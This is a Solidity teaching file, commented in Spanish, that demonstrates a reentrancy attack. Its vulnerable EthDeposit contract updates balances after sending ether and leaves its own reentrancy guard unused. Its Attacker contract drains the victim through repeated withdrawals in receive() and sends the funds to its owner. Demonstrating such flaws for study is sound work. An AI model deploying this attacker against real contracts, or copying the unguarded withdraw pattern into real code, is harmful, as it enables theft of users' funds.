// SPDX-License-Identifier: MIT
/*
@autor JAGD mayo 2024
Clase para demostrar el ataque de reentrada
Se utilizan las librerías de seguridad OpenZeppelin 
//https://github.com/OpenZeppelin/openzeppelin-contracts */
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
 /******************************************************************************/
//Contrato "víctima"
contract EthDeposit {
    //********************************
    // Inicio cambio para evitar reentrancy attack
    uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;
    uint256 private _status;
    /**
    * @dev llamada no autorizada 
    */
    error ReentrancyGuardReentrantCall();

    constructor() {
        _status = NOT_ENTERED;
    }
    modifier nonReentrant() {
        //función privada que se ejecuta antes
        _nonReentrantBefore();
        _;
        //función privada que se ejecuta después
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        // En la primera llamda el estado será  NOT_ENTERED
        if (_status == ENTERED) {
            //devolvemos error porque ya se está ejecutando
            revert ReentrancyGuardReentrantCall();
        }
        // establecemos la variable para indicar que ya se está ejecutando.
        _status = ENTERED;
    }
    //función que se ejecuta una vez una vez haya terminado de ejecutarse
    function _nonReentrantAfter() private {
        //ya podemos poner el estado a not_entered
        _status = NOT_ENTERED;
    }

    /**
     * @dev devuelve  true si el estado es entered lo que significa que hay una función
     * nonReentrant en la pila de llamadas
     * es una función de comprobación
     */
    function _reentrancyGuardEntered() internal view returns (bool) {
        return _status == ENTERED;
    }    
    //Fin cambio para evitar reentrancy
    //********************************
    

	
    using Address for address payable;
	//mapping que almacena los balances de cada usuario
	mapping(address => uint256) public balance;
	//función para depositar ether en este contrato
	function depositEther() external payable {
		balance[msg.sender] += msg.value;
	}
	
	//función que tiene la vulnerabilidad y que permite extraer los ether
	function withdrawEther() external {
		//envío de ether
		payable(msg.sender).sendValue(balance[msg.sender]);
		//actualizar a 0 después del envío
		balance[msg.sender] = 0;
	}

}


////Contrato atacante
//Con Ownable indicamos que la función de ataque solo la puede ejecutar el que ha desplegado el contrato
contract Attacker  is Ownable(msg.sender) {
	
	//instancia del contrato EthDeposit víctima
	EthDeposit public immutable ethContract;
	
	//el constructor inicializa la dirección del contrato ya desplegado
	constructor(address _ethAddress) {
		ethContract = EthDeposit(_ethAddress);
	}
	
	//función que hace el ataque. 
	function attack() external payable  {
		//1 Hace el depósito.
		ethContract.depositEther{value: msg.value}();
		//2º lo retira
		ethContract.withdrawEther();
	}
	
	receive() external payable {
		if (address(ethContract).balance > 0){
			//Si ha fondos los retiramos
			ethContract.withdrawEther();
			//y los asignamos al owner del contrato
			payable(owner()).transfer(address(this).balance);			
		}
	}	
}
